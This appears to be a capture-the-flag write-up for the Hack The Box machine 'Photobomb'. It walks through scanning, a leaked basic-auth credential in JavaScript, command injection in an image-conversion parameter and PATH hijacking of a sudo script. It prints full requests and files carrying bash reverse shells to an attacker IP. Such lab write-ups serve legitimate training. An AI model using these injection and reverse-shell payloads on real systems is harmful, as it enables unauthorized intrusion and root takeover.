---
title: Photobomb
date: 2022-10-20 12:00:00
categories: [HTB,CTF]
tags: [htb]
---

We are going to exploit Photobomb on Hackthebox.  
After we inspected the Application we will find out that the Credentials for the enpoint `/printer` are leaked in a java script file.  
To get a foothold we will exploit a command injection vulnerability in the image processor and escalate to root using sudo.  

# Enumeration

## Rustscan

We will start by doing a quick scan using Rustscan and identify that Port 22 and 80 are open.

| Port | Service               |
| ---- | --------------------- |
| 22   | OpenSSH 8.2p1 Ubuntu  |
| 80   | nginx 1.18.0 (Ubuntu) |

`sudo rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.129.224.239 -- -sV -sC -oA ./{{ip}}`
```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

Open 10.129.224.239:22
Open 10.129.224.239:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Feroxbuster

Let's see if we can find any interesting files using feroxbuster

`feroxbuster -u http://photobomb.htb/ -t 20 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --no-recursion -k -B -x "zip,rar,txt,html,php,js,7z" -v -e -o ./ferox.txt`

```bash
200      GET        7l       27w      339c http://photobomb.htb/photobomb.js
401      GET        7l       12w      188c http://photobomb.htb/printer
200      GET       22l       95w      843c http://photobomb.htb/
```

## Website and Files

When we visit the site [http://photobomb.htb](http://photobomb.htb) we are greeted with a message that we have to click to get started. The credentials are in our welcome pack according to the site.
Since we haven't received a "welcome pack" and get asked for a username and password on [http://photobomb.htb/printer](http://photobomb.htb/printer) we inspect the application more and check `photobomb.js`

### photobomb.js

Great we found credentials to visit the restricted section.
There are two ways we can use that info
1. Set a cookie `document.cookie="isPhotoBombTechSupport=1"`
2. Use `pH0t0:b0Mb!` as credentials

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

### /printer

On visiting [http://photobomb.htb/printer](http://photobomb.htb/printer) there's not much to discover except some images that we can select, setting the file type, a resolution and a buttong to download photo to print.
That's exactly what happens when we select an image and hit `Download photo to print`, after some time we are able to download a file.

# Exploitation

## Shell

Burp will help us to enumerate that behavior and request we are sending to the application further.
We will discover that the Application takes three parameters and we're sending a POST request to the image processor backend.

**POST Request**

That's how the POST Request looks like when we just hit `Download photo to print`.

```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 222
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=finn-whelen-DTfhsDIWNSg-unsplash.jpg&filetype=png&dimensions=600x400
```

**Command Injection**

After playing around we discover that the `filetype` paramter seems to behave akward when we add `;id` for example. 
Instead of generating an Image we get the message `Failed to generate a copy of finn-whelen-DTfhsDIWNSg-unsplash.jpg`
Let's get a shell by executing a payload and don't forget to URL encode it.

```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 222
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=finn-whelen-DTfhsDIWNSg-unsplash.jpg&dimensions=600x400&filetype=png;bash -c 'bash -i >& /dev/tcp/10.10.10.1/80 0>&1'
```

# Escalation

## Local Enumeration

During enumeration there was a possible privilege escalation vector discovered.
We are able to run `/opt/cleanup.sh` as root and have privileges to set an enviroment variable.

**Sudo Privileges**

```bash
(remote) wizard@photobomb:/home/wizard$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

**cleanup.sh**

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

## Privilege Escalation

Checking `/opt/cleanup.sh` reveals that `find` is called without an absolute path to the binary and relies on the `PATH` environment variable.
Let's create a new folder called `bin` in our home directory, a binary called `find` in our new folder containing a reverse shell payload

**find**

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.1/81 0>&1
```

Make it executable and start `cleanup.sh`

`sudo PATH=/home/wizard/bin:$PATH /opt/cleanup.sh`

We will now receive a connection back on our listener and have a ROOT Shell